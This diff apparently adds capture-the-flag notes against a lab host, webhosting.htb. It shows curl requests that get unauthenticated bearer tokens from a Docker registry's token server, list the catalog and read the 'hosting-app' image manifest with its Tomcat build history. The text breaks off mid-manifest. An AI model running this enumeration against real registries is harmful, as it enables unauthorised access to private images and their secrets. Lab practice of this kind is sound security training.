@@ -1,0 +1,261 @@
+curl -k --location 'https://www.webhosting.htb:5000/v2/_catalog'
+{"errors":[{"code":"UNAUTHORIZED","message":"authentication required","detail":[{"Type":"registry","Class":"","Name":"catalog","Action":"*"}]}]}
+
+curl -k --location 'https://webhosting.htb:5001/auth?service=Docker+registry&scope=registry:catalog:*'
+{"access_token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6IlFYNjY6MkUyQTpZT0xPOjdQQTM6UEdRSDpHUVVCOjVTQk06UlhSMjpUSkM0OjVMNFg6TVVZSjpGSEVWIn0.eyJpc3MiOiJBY21lIGF1dGggc2VydmVyIiwic3ViIjoiIiwiYXVkIjoiRG9ja2VyIHJlZ2lzdHJ5IiwiZXhwIjoxNjkwNjEwMjE2LCJuYmYiOjE2OTA2MDkzMDYsImlhdCI6MTY5MDYwOTMxNiwianRpIjoiMjExODk5NTk1MDIxMTU2MjcxNyIsImFjY2VzcyI6W3sidHlwZSI6InJlZ2lzdHJ5IiwibmFtZSI6ImNhdGFsb2ciLCJhY3Rpb25zIjpbIioiXX1dfQ.ecM5LZAw4PdeN2jgYLhAISKQqwYTEollkqH3Hco49TOfbWCBDJwbMVq6P8a3cB-7SUoL-EAqrqY4HQlpRLrIbvuZal-Vz4NFxbUFeQgVnaLeBiGWEnDLyTswRTfRC-NdjNs_DBMXIHUQEnEpg_DNSPpiOz1KXgT3hlJTRXIYUSOzc-CPL9O1YAI7GqmN6czbYYr5ObMUxyx35NsKB5-Xy1w-33UjXTRWGDv8oMS81wezmszmjfFKX_aZbCbPhS-Fc7WFtCZQJ9nqP4fataUFFeJ5fRelaPALI70kSMUndvBV1YrgLak260lULiw6enzM1oQaOz4p0xahTYbhopqlVA","token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6IlFYNjY6MkUyQTpZT0xPOjdQQTM6UEdRSDpHUVVCOjVTQk06UlhSMjpUSkM0OjVMNFg6TVVZSjpGSEVWIn0.eyJpc3MiOiJBY21lIGF1dGggc2VydmVyIiwic3ViIjoiIiwiYXVkIjoiRG9ja2VyIHJlZ2lzdHJ5IiwiZXhwIjoxNjkwNjEwMjE2LCJuYmYiOjE2OTA2MDkzMDYsImlhdCI6MTY5MDYwOTMxNiwianRpIjoiMjExODk5NTk1MDIxMTU2MjcxNyIsImFjY2VzcyI6W3sidHlwZSI6InJlZ2lzdHJ5IiwibmFtZSI6ImNhdGFsb2ciLCJhY3Rpb25zIjpbIioiXX1dfQ.ecM5LZAw4PdeN2jgYLhAISKQqwYTEollkqH3Hco49TOfbWCBDJwbMVq6P8a3cB-7SUoL-EAqrqY4HQlpRLrIbvuZal-Vz4NFxbUFeQgVnaLeBiGWEnDLyTswRTfRC-NdjNs_DBMXIHUQEnEpg_DNSPpiOz1KXgT3hlJTRXIYUSOzc-CPL9O1YAI7GqmN6czbYYr5ObMUxyx35NsKB5-Xy1w-33UjXTRWGDv8oMS81wezmszmjfFKX_aZbCbPhS-Fc7WFtCZQJ9nqP4fataUFFeJ5fRelaPALI70kSMUndvBV1YrgLak260lULiw6enzM1oQaOz4p0xahTYbhopqlVA"}
+
+curl -k --location 'https://www.webhosting.htb:5000/v2/_catalog' --header 'Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6IlFYNjY6MkUyQTpZT0xPOjdQQTM6UEdRSDpHUVVCOjVTQk06UlhSMjpUSkM0OjVMNFg6TVVZSjpGSEVWIn0.eyJpc3MiOiJBY21lIGF1dGggc2VydmVyIiwic3ViIjoiIiwiYXVkIjoiRG9ja2VyIHJlZ2lzdHJ5IiwiZXhwIjoxNjkwNjEyODQ2LCJuYmYiOjE2OTA2MTE5MzYsImlhdCI6MTY5MDYxMTk0NiwianRpIjoiMzAyOTYwNTM3NDU3ODEyNjQyOCIsImFjY2VzcyI6W3sidHlwZSI6InJlZ2lzdHJ5IiwibmFtZSI6ImNhdGFsb2ciLCJhY3Rpb25zIjpbIioiXX1dfQ.cM9-8WTU3GUTzpThE3AXd9g7R9UeZI1bR-4LSiA0nhJEP6MNkdSO2-ZB2hn35PqEUNY2LchEaYJLFPB2olxaghQ3a7NWaTGwTdmLJ8-mhEkk4GidwxjO3SHrASBJDoXHeuArxSYbzlJyRFUDMV-HEjLvd31eYkqBI8ZKs8DVF3mq7rlBXdqNItf-ePZagb6Dd7MJpHnn6Mr7QLnl570z8SVlYuph4bjA6c7IS6GZld7ZApw2rM2xq_DWXhQ9Bpzkow7uTBm3vybEvYSprU6e5swXwkG8rl6VfKjWuMIlNoKhD9DOmOABlWXOMis4FX_9KrRW6hU7ZkXSNOkUJOr_PA'
+
+curl -k --location 'https://webhosting.htb:5001/auth?service=Docker+registry&scope=repository:hosting-app:pull'
+{"access_token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6IlFYNjY6MkUyQTpZT0xPOjdQQTM6UEdRSDpHUVVCOjVTQk06UlhSMjpUSkM0OjVMNFg6TVVZSjpGSEVWIn0.eyJpc3MiOiJBY21lIGF1dGggc2VydmVyIiwic3ViIjoiIiwiYXVkIjoiRG9ja2VyIHJlZ2lzdHJ5IiwiZXhwIjoxNjkwNjEwNDQ5LCJuYmYiOjE2OTA2MDk1MzksImlhdCI6MTY5MDYwOTU0OSwianRpIjoiNjM4OTk0OTI2MjMyNjQxNDgxMSIsImFjY2VzcyI6W3sidHlwZSI6InJlcG9zaXRvcnkiLCJuYW1lIjoiaG9zdGluZy1hcHAiLCJhY3Rpb25zIjpbInB1bGwiXX1dfQ.VTlRghSzTPsJG5kNog1JH82jDxZrptKSm9Oai7rswlrFJd8PCUfVOv9Xg2bbZgJuJBnpniMcVaYXHdn4y3E0BaeOQSY-2DpbKG5wx3kAWmzHdV0ng5apTFxAiNMMxyQ6s3hL9m5I4BPSVQpQNUqo91WunC0XZ43nKIwiMzhGRKnmi44QnMyTUamNSVkQud_chznqzk9jKgFl3UiZGCb4g29KMSl52hhjJsqWKPnB2QndWuzwsUt5HON24SbbjZikFeMTnj6s-O7hwDsJoqr5TeyESZuMwwlNj61eRNwJGcBe9abTIfgx2rWM3e-oAOH-vR_R1W5ATEgjVQxnAimOHQ","token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6IlFYNjY6MkUyQTpZT0xPOjdQQTM6UEdRSDpHUVVCOjVTQk06UlhSMjpUSkM0OjVMNFg6TVVZSjpGSEVWIn0.eyJpc3MiOiJBY21lIGF1dGggc2VydmVyIiwic3ViIjoiIiwiYXVkIjoiRG9ja2VyIHJlZ2lzdHJ5IiwiZXhwIjoxNjkwNjEwNDQ5LCJuYmYiOjE2OTA2MDk1MzksImlhdCI6MTY5MDYwOTU0OSwianRpIjoiNjM4OTk0OTI2MjMyNjQxNDgxMSIsImFjY2VzcyI6W3sidHlwZSI6InJlcG9zaXRvcnkiLCJuYW1lIjoiaG9zdGluZy1hcHAiLCJhY3Rpb25zIjpbInB1bGwiXX1dfQ.VTlRghSzTPsJG5kNog1JH82jDxZrptKSm9Oai7rswlrFJd8PCUfVOv9Xg2bbZgJuJBnpniMcVaYXHdn4y3E0BaeOQSY-2DpbKG5wx3kAWmzHdV0ng5apTFxAiNMMxyQ6s3hL9m5I4BPSVQpQNUqo91WunC0XZ43nKIwiMzhGRKnmi44QnMyTUamNSVkQud_chznqzk9jKgFl3UiZGCb4g29KMSl52hhjJsqWKPnB2QndWuzwsUt5HON24SbbjZikFeMTnj6s-O7hwDsJoqr5TeyESZuMwwlNj61eRNwJGcBe9abTIfgx2rWM3e-oAOH-vR_R1W5ATEgjVQxnAimOHQ"}
+
+curl -k --location 'https://webhosting.htb:5000/v2/hosting-app/manifests/latest' --header 'Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6IlFYNjY6MkUyQTpZT0xPOjdQQTM6UEdRSDpHUVVCOjVTQk06UlhSMjpUSkM0OjVMNFg6TVVZSjpGSEVWIn0.eyJpc3MiOiJBY21lIGF1dGggc2VydmVyIiwic3ViIjoiIiwiYXVkIjoiRG9ja2VyIHJlZ2lzdHJ5IiwiZXhwIjoxNjkwNjEwNDQ5LCJuYmYiOjE2OTA2MDk1MzksImlhdCI6MTY5MDYwOTU0OSwianRpIjoiNjM4OTk0OTI2MjMyNjQxNDgxMSIsImFjY2VzcyI6W3sidHlwZSI6InJlcG9zaXRvcnkiLCJuYW1lIjoiaG9zdGluZy1hcHAiLCJhY3Rpb25zIjpbInB1bGwiXX1dfQ.VTlRghSzTPsJG5kNog1JH82jDxZrptKSm9Oai7rswlrFJd8PCUfVOv9Xg2bbZgJuJBnpniMcVaYXHdn4y3E0BaeOQSY-2DpbKG5wx3kAWmzHdV0ng5apTFxAiNMMxyQ6s3hL9m5I4BPSVQpQNUqo91WunC0XZ43nKIwiMzhGRKnmi44QnMyTUamNSVkQud_chznqzk9jKgFl3UiZGCb4g29KMSl52hhjJsqWKPnB2QndWuzwsUt5HON24SbbjZikFeMTnj6s-O7hwDsJoqr5TeyESZuMwwlNj61eRNwJGcBe9abTIfgx2rWM3e-oAOH-vR_R1W5ATEgjVQxnAimOHQ'
+{
+   "schemaVersion": 1,
+   "name": "hosting-app",
+   "tag": "latest",
+   "architecture": "amd64",
+   "fsLayers": [
+      {
+         "blobSum": "sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4"
+      },
+      {
+         "blobSum": "sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4"
+      },
+      {
+         "blobSum": "sha256:0bf45c325a696381eea5176baa1c8e84fbf0fe5e2ddf96a22422b10bf879d0ba"
+      },
+      {
+         "blobSum": "sha256:4a19a05f49c2d93e67d7c9ea8ba6c310d6b358e811c8ae37787f21b9ad82ac42"
+      },
+      {
+         "blobSum": "sha256:9e700b74cc5b6f81ed6513fa03c7b6ab11a71deb8e27604632f723f81aca3268"
+      },
+      {
+         "blobSum": "sha256:b5ac54f57d23fa33610cb14f7c21c71aa810e58884090cead5e3119774a202dc"
+      },
+      {
+         "blobSum": "sha256:396c4a40448860471ae66f68c261b9a0ed277822b197730ba89cb50528f042c7"
+      },
+      {
+         "blobSum": "sha256:9d5bcc17fed815c4060b373b2a8595687502925829359dc244dd4cdff777a96c"
+      },
+      {
+         "blobSum": "sha256:ab55eca3206e27506f679b41b39ba0e4c98996fa347326b6629dae9163b4c0ec"
+      },
+      {
+         "blobSum": "sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4"
+      },
+      {
+         "blobSum": "sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4"
+      },
+      {
+         "blobSum": "sha256:f7b708f947c32709ecceaffd85287d5eb9916a3013f49c8416228ef22c2bf85e"
+      },
+      {
+         "blobSum": "sha256:497760bf469e19f1845b7f1da9cfe7e053beb57d4908fb2dff2a01a9f82211f9"
+      },
+      {
+         "blobSum": "sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4"
+      },
+      {
+         "blobSum": "sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4"
+      },
+      {
+         "blobSum": "sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4"
+      },
+      {
+         "blobSum": "sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4"
+      },
+      {
+         "blobSum": "sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4"
+      },
+      {
+         "blobSum": "sha256:e4cc5f625cda9caa32eddae6ac29b170c8dc1102988b845d7ab637938f2f6f84"
+      },
+      {
+         "blobSum": "sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4"
+      },
+      {
+         "blobSum": "sha256:0da484dfb0612bb168b7258b27e745d0febf56d22b8f10f459ed0d1dfe345110"
+      },
+      {
+         "blobSum": "sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4"
+      },
+      {
+         "blobSum": "sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4"
+      },
+      {
+         "blobSum": "sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4"
+      },
+      {
+         "blobSum": "sha256:7b43ca85cb2c7ccc62e03067862d35091ee30ce83e7fed9e135b1ef1c6e2e71b"
+      },
+      {
+         "blobSum": "sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4"
+      },
+      {
+         "blobSum": "sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4"
+      },
+      {
+         "blobSum": "sha256:fa7536dd895ade2421a9a0fcf6e16485323f9e2e45e917b1ff18b0f648974626"
+      },
+      {
+         "blobSum": "sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4"
+      },
+      {
+         "blobSum": "sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4"
+      },
+      {
+         "blobSum": "sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4"
+      },
+      {
+         "blobSum": "sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4"
+      },
+      {
+         "blobSum": "sha256:5de5f69f42d765af6ffb6753242b18dd4a33602ad7d76df52064833e5c527cb4"
+      },
+      {
+         "blobSum": "sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4"
+      },
+      {
+         "blobSum": "sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4"
+      },
+      {
+         "blobSum": "sha256:ff3a5c916c92643ff77519ffa742d3ec61b7f591b6b7504599d95a4a41134e28"
+      }
+   ],
+   "history": [
+      {
+         "v1Compatibility": "{\"architecture\":\"amd64\",\"config\":{\"Hostname\":\"\",\"Domainname\":\"\",\"User\":\"app\",\"AttachStdin\":false,\"AttachStdout\":false,\"AttachStderr\":false,\"ExposedPorts\":{\"8080/tcp\":{}},\"Tty\":false,\"OpenStdin\":false,\"StdinOnce\":false,\"Env\":[\"PATH=/usr/local/tomcat/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/lib/jvm/java-1.8-openjdk/jre/bin:/usr/lib/jvm/java-1.8-openjdk/bin\",\"LANG=C.UTF-8\",\"JAVA_HOME=/usr/lib/jvm/java-1.8-openjdk/jre\",\"JAVA_VERSION=8u151\",\"JAVA_ALPINE_VERSION=8.151.12-r0\",\"CATALINA_HOME=/usr/local/tomcat\",\"TOMCAT_NATIVE_LIBDIR=/usr/local/tomcat/native-jni-lib\",\"LD_LIBRARY_PATH=/usr/local/tomcat/native-jni-lib\",\"GPG_KEYS=05AB33110949707C93A279E3D3EFE6B686867BA6 07E48665A34DCAFAE522E5E6266191C37C037D42 47309207D818FFD8DCD3F83F1931D684307A10A5 541FBE7D8F78B25E055DDEE13C370389288584E7 61B832AC2F1C5A90F0F9B00A1C506407564C17A3 79F7026C690BAA50B92CD8B66A3AD3F4F22C4FED 9BA44C2621385CB966EBA586F72C284D731FABEE A27677289986DB50844682F8ACB77FC2E86E29AC A9C5DF4D22E99998D9875A5110C01C5A2F6059E7 DCFD35E0BF8CA7344752DE8B6FB21E8933C60243 F3A04C595DB5B6A5F1ECA43E3B7BBB100D811BBE F7DA48BB64BCB84ECBA7EE6935CD23C10D498E23\",\"TOMCAT_MAJOR=9\",\"TOMCAT_VERSION=9.0.2\",\"TOMCAT_SHA1=b59e1d658a4edbca7a81d12fd6f20203a4da9743\",\"TOMCAT_TGZ_URLS=https://www.apache.org/dyn/closer.cgi?action=download\\u0026filename=tomcat/tomcat-9/v9.0.2/bin/apache-tomcat-9.0.2.tar.gz \\thttps://www-us.apache.org/dist/tomcat/tomcat-9/v9.0.2/bin/apache-tomcat-9.0.2.tar.gz \\thttps://www.apache.org/dist/tomcat/tomcat-9/v9.0.2/bin/apache-tomcat-9.0.2.tar.gz \\thttps://archive.apache.org/dist/tomcat/tomcat-9/v9.0.2/bin/apache-tomcat-9.0.2.tar.gz\",\"TOMCAT_ASC_URLS=https://www.apache.org/dyn/closer.cgi?action=download\\u0026filename=tomcat/tomcat-9/v9.0.2/bin/apache-tomcat-9.0.2.tar.gz.asc \\thttps://www-us.apache.org/dist/tomcat/tomcat-9/v9.0.2/bin/apache-tomcat-9.0.2.tar.gz.asc \\thttps://www.apache.org/dist/tomcat/tomcat-9/v9.0.2/bin/apache-tomcat-9.0.2.tar.gz.asc \\thttps://archive.apache.org/dist/tomcat/tomcat-9/v9.0.2/bin/apache-tomcat-9.0.2.tar.gz.asc\"],\"Cmd\":[\"catalina.sh\",\"run\"],\"Image\":\"sha256:57f3a04ba3229928a30942945b0fb3c74bd61cec80cbc5a41d7d61a2d1c3ec4f\",\"Volumes\":null,\"WorkingDir\":\"/usr/local/tomcat\",\"Entrypoint\":null,\"OnBuild\":[],\"Labels\":null},\"container\":\"2f8f037b0e059fa89bc318719f991b783cd3c4b92de4a6776cc5ec3a8530d6ba\",\"container_config\":{\"Hostname\":\"2f8f037b0e05\",\"Domainname\":\"\",\"User\":\"app\",\"AttachStdin\":false,\"AttachStdout\":false,\"AttachStderr\":false,\"ExposedPorts\":{\"8080/tcp\":{}},\"Tty\":false,\"OpenStdin\":false,\"StdinOnce\":false,\"Env\":[\"PATH=/usr/local/tomcat/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/lib/jvm/java-1.8-openjdk/jre/bin:/usr/lib/jvm/java-1.8-openjdk/bin\",\"LANG=C.UTF-8\",\"JAVA_HOME=/usr/lib/jvm/java-1.8-openjdk/jre\",\"JAVA_VERSION=8u151\",\"JAVA_ALPINE_VERSION=8.151.12-r0\",\"CATALINA_HOME=/usr/local/tomcat\",\"TOMCAT_NATIVE_LIBDIR=/usr/local/tomcat/native-jni-lib\",\"LD_LIBRARY_PATH=/usr/local/tomcat/native-jni-lib\",\"GPG_KEYS=05AB33110949707C93A279E3D3EFE6B686867BA6 07E48665A34DCAFAE522E5E6266191C37C037D42 47309207D818FFD8DCD3F83F1931D684307A10A5 541FBE7D8F78B25E055DDEE13C370389288584E7 61B832AC2F1C5A90F0F9B00A1C506407564C17A3 79F7026C690BAA50B92CD8B66A3AD3F4F22C4FED 9BA44C2621385CB966EBA586F72C284D731FABEE A27677289986DB50844682F8ACB77FC2E86E29AC A9C5DF4D22E99998D9875A5110C01C5A2F6059E7 DCFD35E0BF8CA7344752DE8B6FB21E8933C60243 F3A04C595DB5B6A5F1ECA43E3B7BBB100D811BBE F7DA48BB64BCB84ECBA7EE6935CD23C10D498E23\",\"TOMCAT_MAJOR=9\",\"TOMCAT_VERSION=9.0.2\",\"TOMCAT_SHA1=b59e1d658a4edbca7a81d12fd6f20203a4da9743\",\"TOMCAT_TGZ_URLS=https://www.apache.org/dyn/closer.cgi?action=download\\u0026filename=tomcat/tomcat-9/v9.0.2/bin/apache-tomcat-9.0.2.tar.gz \\thttps://www-us.apache.org/dist/tomcat/tomcat-9/v9.0.2/bin/apache-tomcat-9.0.2.tar.gz \\thttps://www.apache.org/dist/tomcat/tomcat-9/v9.0.2/bin/apache-tomcat-9.0.2.tar.gz \\thttps://archive.apache.org/dist/tomcat/tomcat-9/v9.0.2/bin/apache-tomcat-9.0.2.tar.gz\",\"TOMCAT_ASC_URLS=https://www.apache.org/dyn/closer.cgi?action=download\\u0026filename=tomcat/tomcat-9/v9.0.2/bin/apache-tomcat-9.0.2.tar.gz.asc \\thttps://www-us.apache.org/dist/tomcat/tomcat-9/v9.0.2/bin/apache-tomcat-9.0.2.tar.gz.asc \\thttps://www.apache.org/dist/tomcat/tomcat-9/v9.0.2/bin/apache-tomcat-9.0.2.tar.gz.asc \\thttps://archive.apache.org/dist/tomcat/tomcat-9/v9.0.2/bin/apache-tomcat-9.0.2.tar.gz.asc\"],\"Cmd\":[\"/bin/sh\",\"-c\",\"#(nop) \",\"CMD [\\\"catalina.sh\\\" \\\"run\\\"]\"],\"Image\":\"sha256:57f3a04ba3229928a30942945b0fb3c74bd61cec80cbc5a41d7d61a2d1c3ec4f\",\"Volumes\":null,\"WorkingDir\":\"/usr/local/tomcat\",\"Entrypoint\":null,\"OnBuild\":[],\"Labels\":{}},\"created\":\"2023-07-04T10:57:03.768956926Z\",\"docker_version\":\"20.10.23\",\"id\":\"1f5797acb3ce332a92212fac43141b9179f396db844876ea976828c027cc5cd2\",\"os\":\"linux\",\"parent\":\"b581fd7323f8b829979a384105c27aeff6f114f0b5e63aaa00e4090ce50df370\",\"throwaway\":true}"
+      },
+      {
+         "v1Compatibility": "{\"id\":\"b581fd7323f8b829979a384105c27aeff6f114f0b5e63aaa00e4090ce50df370\",\"parent\":\"1c287aa55678a4fa6681ba16d09ce6bf798fac6640dceb43230e18a04316aee1\",\"created\":\"2023-07-04T10:57:03.500684978Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c #(nop)  USER app\"]},\"throwaway\":true}"
+      },
+      {
+         "v1Compatibility": "{\"id\":\"1c287aa55678a4fa6681ba16d09ce6bf798fac6640dceb43230e18a04316aee1\",\"parent\":\"c5b60d48ea6e9578b52142829c5a979f0429207c7ff107f556c73b2d00230ba2\",\"created\":\"2023-07-04T10:57:03.230181852Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c #(nop) COPY --chown=app:appfile:24e216b758a41629b4357c4cd3aa1676635e7f68b432edff5124a8af4b95362f in /etc/hosting.ini \"]}}"
+      },
+      {
+         "v1Compatibility": "{\"id\":\"c5b60d48ea6e9578b52142829c5a979f0429207c7ff107f556c73b2d00230ba2\",\"parent\":\"8352728bd14b4f5a18051ae76ce15e3d3a97180d5a699b3847d89570e37354f1\",\"created\":\"2023-07-04T10:57:02.865658784Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c chown -R app /usr/local/tomcat/\"]}}"
+      },
+      {
+         "v1Compatibility": "{\"id\":\"8352728bd14b4f5a18051ae76ce15e3d3a97180d5a699b3847d89570e37354f1\",\"parent\":\"a785065e8f19dad061ddf5035668d11bc69cd943634130ffd35ab8fcd9884da0\",\"created\":\"2023-07-04T10:56:56.087876543Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c adduser -S -u 1000 -G app app\"]}}"
+      },
+      {
+         "v1Compatibility": "{\"id\":\"a785065e8f19dad061ddf5035668d11bc69cd943634130ffd35ab8fcd9884da0\",\"parent\":\"690545aba874c1cbffa3b6cfa0b6708cffb39c97d4b823b4cef4abd0db23cce0\",\"created\":\"2023-07-04T10:56:55.215778789Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c addgroup -S -g 1000 app\"]}}"
+      },
+      {
+         "v1Compatibility": "{\"id\":\"690545aba874c1cbffa3b6cfa0b6708cffb39c97d4b823b4cef4abd0db23cce0\",\"parent\":\"a133674c237f389cb7d5e0c12177d5a7f3dcc3f068f6e92561f5898835c827d6\",\"created\":\"2023-07-04T10:56:54.346382505Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c #(nop) COPY file:c7945822095fe4c2530de4cf6bf7c729cbe6af014740a937187ab5d2e35c30f6 in /usr/local/tomcat/webapps/hosting.war \"]}}"
+      },
+      {
+         "v1Compatibility": "{\"id\":\"a133674c237f389cb7d5e0c12177d5a7f3dcc3f068f6e92561f5898835c827d6\",\"parent\":\"57f5a3c239ecc33903be4eabc571b72d8d934124b84dc6bdffb476845a9af610\",\"created\":\"2023-07-04T10:56:53.888849151Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c #(nop) COPY file:9fd68c3bdf49b0400fb5ecb77c7ac57ae96f83db385b6231feb7649f7daa5c23 in /usr/local/tomcat/conf/context.xml \"]}}"
+      },
+      {
+         "v1Compatibility": "{\"id\":\"57f5a3c239ecc33903be4eabc571b72d8d934124b84dc6bdffb476845a9af610\",\"parent\":\"b01f09ef77c3df66690a924577eabb8ed7043baeaa37a1b608370d0489e4fdee\",\"created\":\"2023-07-04T10:56:53.629058758Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c rm -rf /usr/local/tomcat/webapps/ROOT\"]}}"
+      },
+      {
+         "v1Compatibility": "{\"id\":\"b01f09ef77c3df66690a924577eabb8ed7043baeaa37a1b608370d0489e4fdee\",\"parent\":\"80e769c3cd6d9be2bcfea77a058c23d7ea112afaddce9e12c8eebf6d759923fe\",\"created\":\"2018-01-10T09:34:07.981925046Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c #(nop)  CMD [\\\"catalina.sh\\\" \\\"run\\\"]\"]},\"throwaway\":true}"
+      },
+      {
+         "v1Compatibility": "{\"id\":\"80e769c3cd6d9be2bcfea77a058c23d7ea112afaddce9e12c8eebf6d759923fe\",\"parent\":\"f5f0aebde7367c572f72c6d19cbea5b9b039b281b5e140bcd1a9b30ebc4883ce\",\"created\":\"2018-01-10T09:34:07.723478629Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c #(nop)  EXPOSE 8080/tcp\"]},\"throwaway\":true}"
+      },
+      {
+         "v1Compatibility": "{\"id\":\"f5f0aebde7367c572f72c6d19cbea5b9b039b281b5e140bcd1a9b30ebc4883ce\",\"parent\":\"7aa3546803b6195a9839f57454a9d61a490e5e5f921b65b7ce9883615a7fef76\",\"created\":\"2018-01-10T09:34:07.47548453Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c set -e \\t\\u0026\\u0026 nativeLines=\\\"$(catalina.sh configtest 2\\u003e\\u00261)\\\" \\t\\u0026\\u0026 nativeLines=\\\"$(echo \\\"$nativeLines\\\" | grep 'Apache Tomcat Native')\\\" \\t\\u0026\\u0026 nativeLines=\\\"$(echo \\\"$nativeLines\\\" | sort -u)\\\" \\t\\u0026\\u0026 if ! echo \\\"$nativeLines\\\" | grep 'INFO: Loaded APR based Apache Tomcat Native library' \\u003e\\u00262; then \\t\\techo \\u003e\\u00262 \\\"$nativeLines\\\"; \\t\\texit 1; \\tfi\"]}}"
+      },
+      {
+         "v1Compatibility": "{\"id\":\"7aa3546803b6195a9839f57454a9d61a490e5e5f921b65b7ce9883615a7fef76\",\"parent\":\"c23e626ece757750f0686befb692e52700626071dcd62c9b7424740c3683a842\",\"created\":\"2018-01-10T09:33:57.030831358Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c set -eux; \\t\\tapk add --no-cache --virtual .fetch-deps \\t\\tca-certificates \\t\\topenssl \\t; \\t\\tsuccess=; \\tfor url in $TOMCAT_TGZ_URLS; do \\t\\tif wget -O tomcat.tar.gz \\\"$url\\\"; then \\t\\t\\tsuccess=1; \\t\\t\\tbreak; \\t\\tfi; \\tdone; \\t[ -n \\\"$success\\\" ]; \\t\\techo \\\"$TOMCAT_SHA1 *tomcat.tar.gz\\\" | sha1sum -c -; \\t\\tsuccess=; \\tfor url in $TOMCAT_ASC_URLS; do \\t\\tif wget -O tomcat.tar.gz.asc \\\"$url\\\"; then \\t\\t\\tsuccess=1; \\t\\t\\tbreak; \\t\\tfi; \\tdone; \\t[ -n \\\"$success\\\" ]; \\t\\tgpg --batch --verify tomcat.tar.gz.asc tomcat.tar.gz; \\ttar -xvf tomcat.tar.gz --strip-components=1; \\trm bin/*.bat; \\trm tomcat.tar.gz*; \\t\\tnativeBuildDir=\\\"$(mktemp -d)\\\"; \\ttar -xvf bin/tomcat-native.tar.gz -C \\\"$nativeBuildDir\\\" --strip-components=1; \\tapk add --no-cache --virtual .native-build-deps \\t\\tapr-dev \\t\\tcoreutils \\t\\tdpkg-dev dpkg \\t\\tgcc \\t\\tlibc-dev \\t\\tmake \\t\\t\\\"openjdk${JAVA_VERSION%%[-~bu]*}\\\"=\\\"$JAVA_ALPINE_VERSION\\\" \\t\\topenssl-dev \\t; \\t( \\t\\texport CATALINA_HOME=\\\"$PWD\\\"; \\t\\tcd \\\"$nativeBuildDir/native\\\"; \\t\\tgnuArch=\\\"$(dpkg-architecture --query DEB_BUILD_GNU_TYPE)\\\"; \\t\\t./configure \\t\\t\\t--build=\\\"$gnuArch\\\" \\t\\t\\t--libdir=\\\"$TOMCAT_NATIVE_LIBDIR\\\" \\t\\t\\t--prefix=\\\"$CATALINA_HOME\\\" \\t\\t\\t--with-apr=\\\"$(which apr-1-config)\\\" \\t\\t\\t--with-java-home=\\\"$(docker-java-home)\\\" \\t\\t\\t--with-ssl=yes; \\t\\tmake -j \\\"$(nproc)\\\"; \\t\\tmake install; \\t); \\trunDeps=\\\"$( \\t\\tscanelf --needed --nobanner --format '%n#p' --recursive \\\"$TOMCAT_NATIVE_LIBDIR\\\" \\t\\t\\t| tr ',' '\\\\n' \\t\\t\\t| sort -u \\t\\t\\t| awk 'system(\\\"[ -e /usr/local/lib/\\\" $1 \\\" ]\\\") == 0 { next } { print \\\"so:\\\" $1 }' \\t)\\\"; \\tapk add --virtual .tomcat-native-rundeps $runDeps; \\tapk del .fetch-deps .native-build-deps; \\trm -rf \\\"$nativeBuildDir\\\"; \\trm bin/tomcat-native.tar.gz; \\t\\tapk add --no-cache bash; \\tfind ./bin/ -name '*.sh' -exec sed -ri 's|^#!/bin/sh$|#!/usr/bin/env bash|' '{}' +\"]}}"
+      },
+      {
